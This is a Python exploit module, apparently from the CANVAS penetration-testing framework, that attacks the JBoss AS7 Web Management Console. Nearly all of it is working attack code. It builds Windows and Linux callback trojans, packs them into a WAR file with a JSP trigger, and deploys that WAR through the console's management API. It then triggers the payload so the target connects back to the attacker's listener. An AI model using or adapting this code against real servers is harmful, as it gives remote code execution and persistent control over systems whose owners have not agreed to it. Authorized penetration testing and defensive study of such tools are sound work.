# -*- coding: utf-8 -*-
#!/usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2011
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement
import sys
if "." not in sys.path: sys.path.append(".")

import os
import time
import json
import uuid
import shutil
import socket
import zipfile
import urllib2
import exploitutils
import canvasengine

from libs import spkproxy
from tcpexploit import tcpexploit
from libs.canvasos import *
from contextlib import contextmanager
from exploitutils import *

NAME                           = "jboss7_management_deployer"
DESCRIPTION                    = "JBoss AS7 Web Management Console WAR Deployer"
VERSION                        = "1.0"
NOTES                          = """Notes"""
GTK2_DIALOG                    = "dialog.glade2"

DOCUMENTATION                  = {}
DOCUMENTATION["Notes"]         = """

JBoss AS7 has a Web Management Console that provides a way of
deploying new applications (WAR files). This module will deploy a new application using
the Web Management Console in order to get a CANVAS node.

NOTE: By default, JBoss7 starts the console/management interface on localhost:9990.
For this module to work, the console/management interface needs to be accessible from
the host that runs CANVAS.

"""

DOCUMENTATION['VENDOR']        = "Red Hat"
DOCUMENTATION["Repeatability"] = "Infinite"

PROPERTY                       = {}
PROPERTY['TYPE']               = "Tools"
PROPERTY['ARCH']               = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION']            = [ "All" ] # ???


TIMEOUT = 10

@contextmanager
def no_timeout_socket():
    old           = socket.socket
    socket.socket = socket._no_timeoutsocket
    try:
        yield
    finally:
        socket.socket = old

class HeadRequest(urllib2.Request):
    def get_method(self):
        return "HEAD"

class CustomHTTPRedirectHandler(urllib2.HTTPRedirectHandler):
    """
    Custom HTTP Redirect Handler to extract the correct url for the
    Web Management Console. It has a class attribute that will be used
    to get the full url to correlty build all urls needed for the exploit
    """
    # not a nice way of saving the url, but I know for sure that there will be
    # only one instance in one place where this is used
    redirected_url = ""

    def http_error_302(self, req, fp, code, msg, headers):
        CustomHTTPRedirectHandler.redirected_url = req.get_full_url()
        # let the original handler do its work
        return urllib2.HTTPRedirectHandler.http_error_302(self, req, fp, code, msg, headers)

    # use same method for all possible redirections
    http_error_301 = http_error_303 = http_error_307 = http_error_302

opener = urllib2.build_opener(CustomHTTPRedirectHandler)
urllib2.install_opener(opener)

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name               = NAME
        self.host               = ''
        self.hostname           = ''
        self.port               = 8080 # this must be the jboss port used for all pages and not the console port (9990)
        self.path               = '/console'
        self.ssl                = False
        self.base_url           = ""
        self.console_full_url   = ""
        self.console_base_url   = ""
        self.console_port       = 8080 # really needed?
        self.respath            = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))
        self.tmppath            = None
        self.mosdef_type        = "UNIVERSAL" # | HTTP | DNS
        self.dns_domain         = None
        self.http_ssl           = False
        self.jsp_filename       = exploitutils.randomstring(8) + ".jsp"
        self.servlet_name       = exploitutils.randomstring(8)
        self.war_filename       = "%s.war" % self.servlet_name
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.deploy_wait        = 10 # secs to wait for target to finish deploying war
        self.setInfo(DESCRIPTION)

    def neededListenerTypes(self):
        self.getargs()
        if self.mosdef_type == "DNS":
            return [canvasengine.DNSMOSDEF]
        elif self.mosdef_type == "HTTP":
            if self.http_ssl:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        """
        Get arguments for attack
        """

        self.getarg("host")
        self.getarg("hostname")
        self.getarg("port")
        self.getarg("path")
        self.getarg("dns_domain")

        if not self.path.startswith("/"): self.path = "/" + self.path

        self.ssl                = self.getarg("ssl")
        self.basicauth_user     = self.argsDict.get("username", self.basicauth_user)
        self.basicauth_password = self.argsDict.get("password", self.basicauth_password)
        self.mosdef_type        = self.argsDict.get("mosdef_type_value", self.mosdef_type).upper().strip()
        self.deploy_wait        = int(self.argsDict.get("deploy_wait", "10"))


    def setup_UA(self, url):
        """
        Setup everything needed to do requests using spkproxy
        """
        if self.basicauth_user and self.basicauth_password:
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)
            self.log("Using BasicAuth (User: %s - Password: %s)" % (self.basicauth_user, self.basicauth_password))
        else:
            auth = None

        ua = spkproxy.UserAgent(url, auth=auth, hostname=self.hostname, exploit=self)
        return ua

    def trigger_callback(self):
        self.log("Triggering with URL: " + self.trigger_url)
        res = False
        # we try a couple of times because sometimes the first trigger could
        # fail due to permissions in linux
        for i in xrange(0, 5):
            try:
                self.log("Triggering callback (attempt %d)" % i)
                response = spkproxy.urlopen(self.trigger_url)
                content = response.read() # can response be None?
                if response and "MOSDEF Callback successfully triggered" in content:
                    self.log(content)
                    res = True
                    # little delay waiting for our node so ISuccess returns the right value
                    time.sleep(3)
                    break
                else:
                    self.log("MOSDEF Callback execution attempt %d failed. Waiting 5 secs." % i)
                    time.sleep(5)
            except Exception:
                self.log("An error ocurred while trying to trigger MOSDEF Callback. (attempt %d)" % i)
                time.sleep(5)
        if not res:
            self.log("All trigger attempts using URL '%s' failed. " % self.trigger_url)
            self.log("Please make sure the port used in the url is the correct JBoss port and not the console port (9990 by default).")
        return res


    def do_war_upload(self):
        """
        In order to deploy a new war we make 3 requests to the management console
        to upload a new war file.
        The first request uploads the war file content and receives
        a response with the BYTES_VALUE field that is used in the
        second request. Finally we enable the uploaded app.
        Returns True if upload worked and False otherwise
        """
        url = self.console_base_url + "/management/add-content"
        self.log("Uploading WAR file using URL: %s" % url)
        ua = self.setup_UA(url)
        boundary = uuid.uuid1().hex
        ua.addHeader("Content-Type", "multipart/form-data; boundary=%s" % boundary)
        war_filepath = os.path.join(self.tmppath, self.war_filename)
        try:
            f = open(war_filepath)
            war_data = f.read()
        except Exception, e:
            self.log("Could not read file %s. Aborting..." % war_filepath)
            return False

        data = "--%s\r\n" % boundary
        data += "Content-Disposition: form-data; name=\"uploadFormElement\"; filename=\"%s\"\r\n" % self.war_filename
        data += "Content-Type: application/octet-stream\r\n\r\n"
        data += war_data
        data += "\r\n--%s--\r\n" % boundary

        response = ua.POST("", data)

        lines = response.splitlines()
        if lines and lines[0].strip().isdigit():
            json_data = json.loads(lines[1])
            if json_data['outcome'] == "success":
                bytes_value = json_data['result']['BYTES_VALUE']
                return self.confirm_war_upload(bytes_value)
            else:
                self.log("WAR upload failed! (add-content outcome: %s)" % json_data['outcome'])
                return False
        else:
            self.log("WAR upload failed! (we got some unexpected response)")
            return False

    def confirm_war_upload(self, bytes_value):
        """
        Using the bytes_value info this confirms the war filename and operation
        """
        url = self.console_base_url + "/management"
        self.log("Confirming WAR upload using URL: %s" % url)
        ua = self.setup_UA(url)
        ua.addHeader("Content-Type", "text/plain; charset=utf-8")
        data = (
               '{"address":[{"deployment":"%(war_filename)s"}],'
               '"operation":"add","runtime-name":"%(war_filename)s",'
               '"content":[{"hash":{"BYTES_VALUE":"%(bytes_value)s"}}],'
               '"name":"%(war_filename)s"}'
               )
        data = data % {'war_filename': self.war_filename, 'bytes_value': bytes_value}

        response = ua.POST("", data)

        lines = response.splitlines()
        if lines and lines[0].strip().isdigit(): # we are expecting 3 lines. First is length, then data and finally a '0'
            json_data = json.loads(lines[1])
            if json_data['outcome'] == "success":
                return self.enable_war_upload()
            else:
                self.log("WAR upload confirmation failed! (outcome: %s)" % json_data['outcome'])
                return False
        else:
            self.log("WAR upload confirmation failed! (we got some unexpected response)")
            return False

    def enable_war_upload(self):
        """
        This enables the uploaded WAR file
        """
        url = self.console_base_url + "/management"
        self.log("Enabling WAR upload using URL: %s" % url)
        ua = self.setup_UA(url)
        data = '{"address":[{"deployment":"%s"}],"operation":"deploy"}' % self.war_filename

        response = ua.POST("", data)

        lines = response.splitlines()
        if lines and lines[0].strip().isdigit():
            json_data = json.loads(lines[1])
            if json_data['outcome'] == "success":
                # if was uploaded successfuly then we give the target some time to finish deploy
                self.wait_for_deploy()
                return True
            else:
                self.log("WAR enabling failed! (outcome: %s)" % json_data['outcome'])
                return False
        else:
            self.log("WAR enabling failed! (we got some unexpected response)")
            return False


    def check_mgmt_console(self):
        """
        We try to access the Web Management Console url and based on the response code
        we determine if we can run this exploit.
        Returns True if console was found on the given url (even if auth is required).
        Returns False if console was not found meaning exploit won't work
        """

        self.log("Testing Web Management Console on URL: %s" % self.console_full_url)
        # self.UA.GET doesn't return the response code, so we use urllib2 here instead for now
        try:
            with no_timeout_socket():
                response = urllib2.urlopen(self.console_full_url, timeout=TIMEOUT)
                self.log("response code: %d" % response.code)
        except urllib2.URLError, e:
            self.log("Could not connect to target Web Management Console: %s" % str(e))
            return False

        # 200 means we are good to go as it is
        if response.code == 200:
            # urllib2 follows the redirects and in case of a 302 we will still get
            # a 200 as response. Commonly http://target:8080/console will redirect
            # to http://target:9990/console which is the real url we need to use.
            # Now we can get the correct url from our Custom Handler
            new_console_url = CustomHTTPRedirectHandler.redirected_url
            if new_console_url:
                self.console_full_url = new_console_url
                u = urllib2.urlparse.urlsplit(new_console_url)
                self.console_base_url = urllib2.urlparse.urlunsplit((u.scheme, u.netloc, "", "", ""))
                self.console_port = u.port
            self.log("Web Management Console was found at %s and no authentication seems to be required" %
                     self.console_full_url)
            return True

        elif response.code == 401:
            self.log("Web Management Console was found and authentication is required")
            if not self.basicauth_password and not self.basicauth_user:
                self.log("You must provide credentials")
                return False
            else:
                self.log("Credentials provided will be used to authenticate")
            return True

        # 404 not found!! console may not be available or may be in another URL
        elif response.code == 404:
            self.log("Web Management Console was not found on the URL provided. Please make sure URL is correct. Exiting...")
            return False

        else: # other response codes will just be ignored
            self.log("Response code %d was received when trying to access Web Management Console. Exiting...")
            return False

    def run(self):
        ret = False
        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.hostname, self.port))
        self.getargs()

        if not self.host: self.host = self.target.interface
        if not self.hostname: self.hostname = self.host
        if not self.dns_domain: self.dns_domain = "%s.%s" % (self.name, self.host)

        # build url protocol://hostname:port + path
        protocol = "https" if self.ssl else "http"
        self.base_url = "%s://%s:%s" % (protocol, self.hostname, self.port)
        # these will be updated in case of a redirection
        self.console_port = self.port
        self.console_base_url = self.base_url
        self.console_full_url = "%s%s" % (self.console_base_url, self.path)
        # port provided by the user must be where jboss is listening, not the web console port (9990)
        self.trigger_url = self.base_url + "/%s/%s" % (self.servlet_name, self.jsp_filename)

        self.tmppath = self.engine.create_new_session_output_dir(self.host, 'temp_files')

        if not self.check_mgmt_console():
            return self._exit(success=False)

        self.log("Attacking %s:%d" % (self.hostname, self.port))

        if not self.build_trojans():
            return self._exit(success=False)

        self.create_deployment_files()

        if self.do_war_upload():
            self.trigger_callback()

        self.clean_temp_resources()

        if self.ISucceeded():
            self.show_trigger_message()
            return self._exit(success=True)
        else:
            return self._exit(success=False)


    def _prepare_file(self, repls, template_filename, real_filename):
        """
        Creates a copy of the template_filename named as real_name
        and replaces all items inside repls dictionary
        """
        template_file = open(template_filename, "rt")
        template = template_file.read()
        template_file.close()
        real_file = open(real_filename, "wt")
        for r, v in repls.iteritems():
            template = template.replace(r, v)
        real_file.write(template)
        real_file.close()

    def create_deployment_files(self):
        """
        Creates a WAR file together with a jsp file and the MOSDEF trojans.
        All files are stored in this exploit's resource folder.
        """

        war_fullpath = os.path.join(self.tmppath, self.war_filename)

        # copy web-template.xml and update SERVLETNAME
        repls = {
            "[SERVLETNAME]" : self.servlet_name,
            "[JSPFILENAME]" : self.jsp_filename,
        }
        self._prepare_file(repls, os.path.join(self.respath, "web.xml.template"),
                           os.path.join(self.tmppath, "web.xml"))

        # copy the callback.jsp.template and just rename it to the new random name
        shutil.copy(os.path.join(self.respath, "callback.jsp.template"),
                    os.path.join(self.tmppath, self.jsp_filename))

        war_file = zipfile.ZipFile(war_fullpath, "w")
        war_file.write(os.path.join(self.tmppath, self.jsp_filename), self.jsp_filename)
        war_file.write(os.path.join(self.tmppath, "web.xml"), "WEB-INF/web.xml")
        war_file.write(os.path.join(self.respath, "MANIFEST.MF"), "META-INF/MANIFEST.MF")
        platforms = ("linux", "windows") if self.mosdef_type != "DNS" else ("windows",)
        for p in platforms:
            for a in ("X86", "X64"):
                callback_filename = "callback_%s_%s.exe" % (p, a)
                war_file.write(os.path.join(self.tmppath, callback_filename), callback_filename)

        war_file.close()


    def clean_temp_resources(self):
        """
        Cleanup any local temp file created during exploit execution.
        """
        self.log("Cleaning local temp files...")
        delete_files = []
        delete_files.append(os.path.join(self.tmppath, self.jsp_filename))
        delete_files.append(os.path.join(self.tmppath, self.war_filename))
        delete_files.append(os.path.join(self.tmppath, "web.xml"))
        for p in ("linux", "windows"):
            for a in ("X86", "X64"):
                delete_files.append(os.path.join(self.tmppath, "callback_%s_%s.exe") % (p, a))

        for f in delete_files:
            try:
                os.remove(f)
            except Exception:
                pass

    def build_trojans(self):
        """
        Builds mosdef two trojans (x86 & x64) according to the selected mosdef type.
        These two trojans are later used to deploy the WAR module
        """
        msg = "Building MOSDEF trojans (type: %s - Callback ip: %s)" % (self.mosdef_type, str(self.callback.ip))
        #msg += " - SSL = %s)" % str(self.http_ssl) if self.mosdef_type == "HTTP" else ")"
        self.log(msg)
        if self.mosdef_type == "UNIVERSAL":
            return self.build_universal_trojans()
        elif self.mosdef_type == "HTTP":
            return self.build_universal_trojans(http=True, ssl=self.http_ssl)
        else:
            return self.build_dns_trojans()

    def build_dns_trojans(self):
        self.log("Warning: MOSDEF DNS is only available for Windows targets. "
                 "If your target is a Linux host the exploit won't work")
        filename = os.path.join(self.tmppath, "callback_windows_X86.exe")
        trojanmod = self.engine.getModuleExploit("BuildDNSCallback")
        trojanmod.link(self)
        trojanmod.argsDict["proxyaddr"] = self.callback.ip
        trojanmod.argsDict["domain"]    = self.dns_domain
        trojanmod.argsDict["filename"]  = filename
        ret = trojanmod.run()
        #XXX: DNS mosdef is still not available for 64bits, so just to make it work
        # for now, we make a copy of the x86 binary to have the x64 callback file
        if ret:
            try:
                shutil.copyfile(filename, filename.replace("X86", "X64"))
            except IOError:
                ret = 0
        return ret

    def build_universal_trojans(self, http=False, ssl=False):
        res = True
        self.log("Creating MOSDEF Trojans for ip: %s and port: %s" % (str(self.callback.ip), str(self.callback.port)))
        for platform in ("Windows", "Linux"):
            t_os = canvasos(platform)
            for arch in ("X86", "X64"):
                t_os.arch = arch
                # nasty way of creating an x64 binary for linux... x64 is still not supported
                if platform == "Linux" and arch == "X64":
                    t_os.arch = "X86"
                try:
                    ret = self.buildmosdeftrojan(self.callback.ip, self.callback.port,
                                                 target_os=t_os, universal=True,
                                                 http=http, ssl=ssl)
                    if ret:
                        filename = os.path.join(self.tmppath, "callback_%s_%s.exe" % (platform.lower(), arch))
                        with open(filename,"wb") as f:
                            f.write(self.mosdeftrojan)
                except Exception, err:
                    self.log("Problem building MOSDEF trojan: %s" % str(err))
                    res = False
        return res

    def wait_for_deploy(self):
        self.log("Giving the target some time to deploy. Waiting %d seconds" % self.deploy_wait)
        time.sleep(self.deploy_wait)
        return True

    def show_trigger_message(self):
        port = "53" if self.mosdef_type == "DNS" else str(self.callback.port)
        self.log("IMPORTANT: you can get a new node back without running the exploit again by manually starting a %s MOSDEF listener on interface %s and port %s "
                 " and then requesting the following trigger URL: %s" % (self.mosdef_type, str(self.callback.ip), port, self.trigger_url))

    def _exit(self, success=True):
        if success:
            self.setInfo("%s attacking %s:%d - done (success!)" % (NAME, self.host, self.port))
            return 1
        else:
            self.setInfo("%s attacking %s:%d - done (failed)" % (NAME, self.host, self.port))
            return 0

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
